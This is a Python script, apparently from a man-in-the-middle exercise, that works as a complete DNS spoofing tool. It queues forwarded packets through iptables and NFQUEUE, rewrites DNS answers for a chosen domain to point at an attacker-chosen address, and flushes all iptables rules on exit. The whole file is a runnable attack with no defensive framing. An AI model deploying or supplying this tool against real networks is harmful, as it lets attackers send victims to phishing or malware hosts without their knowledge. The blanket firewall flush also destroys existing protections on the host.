import netfilterqueue as nfq
import scapy.all as scapy
import subprocess
import optparse
import functools


def get_args():
    parser = optparse.OptionParser()
    parser.add_option('--spoof',
                      '-s',
                      dest='spoof',
                      help='Domain to spoof DNS requests')
    parser.add_option('--redirect',
                      '-r',
                      dest='redirect',
                      help='IP or domain to redirect traffic to')

    (opts, args) = parser.parse_args()
    spoof = opts.spoof
    redirect = opts.redirect
    if not spoof:
        spoof = input('/-/ Enter the domain to spoof DNS requests > ')
    if not redirect:
        redirect = input(
            f'/-/ Enter the IP or domain to redirect the traffic from {spoof} to > '
        )
    return spoof, redirect


def iptables():
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)


def run_queue(spoof, redirect):
    queue = nfq.NetfilterQueue()
    queue.bind(
        0, functools.partial(process_packet, spoof=spoof, redirect=redirect))
    queue.run()


def process_packet(packet, spoof, redirect):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if spoof in str(qname).lower():
            print(f'/+/ Spoofing traffic from {spoof} to {redirect}')
            ans = scapy.DNSRR(rrname=qname, rdata=redirect)
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            if scapy_packet.haslayer(scapy.UDP):
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


def main():
    (spoof, redirect) = get_args()
    try:
        iptables()
        run_queue(spoof, redirect)
    except KeyboardInterrupt:
        print('\n/!/ Quitting DNS Spoofer.')
        print('/-/ Flushing iptables.')
        subprocess.call('iptables --flush', shell=True)

main()